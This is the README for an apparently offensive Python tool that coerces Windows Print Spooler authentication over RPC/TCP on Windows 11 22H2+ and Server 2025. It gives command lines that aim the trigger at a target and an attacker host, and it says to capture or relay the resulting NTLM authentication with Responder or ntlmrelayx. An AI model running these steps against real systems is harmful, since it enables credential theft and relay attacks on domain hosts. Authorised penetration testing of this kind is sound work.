# Pure RPC over TCP Printer Spooler Trigger
## For Windows 11 22H2+ / Windows Server 2025


## Usage
```
printerbugnew.py <target_host> [username] [password] [domain] [attacker_host] [tcp_port]
```

## Examples

### Anonymous connection
```bash
printerbugnew.py 192.168.1.100
```

### With credentials
```bash
printerbugnew.py 192.168.1.100 admin Password123 DOMAIN
```

### Trigger backconnect to different host (attacker)
```bash
printerbugnew.py 192.168.1.100 admin Password123 DOMAIN 192.168.1.50
```

### Use specific RPC port
```bash
printerbugnew.py 192.168.1.100 admin Password123 DOMAIN 192.168.1.50 49152
```

## Notes
- Target must be Windows 11 22H2+ or Server 2025 (RPC over TCP default)
- For older versions, spoolss uses RPC over Named Pipes (SMB)
- Ensure ports 135 and dynamic RPC ports (49152-65535) are open
- Start Responder or ntlmrelayx on remote_host to capture auth
- Kerberos fails in this case due to a bad SPN from the spooler, forcing NTLM fallback.
- Find the target spooler’s RPC/TCP port by querying the target Endpoint Mapper (EPM) on TCP/135 for the interface UUID 12345678-1234-abcd-ef00-0123456789ab. You can use rpcdump.py, PortQry, or any tool you prefer - or just implement the EPM lookup directly in this code ;)
- Based on https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py
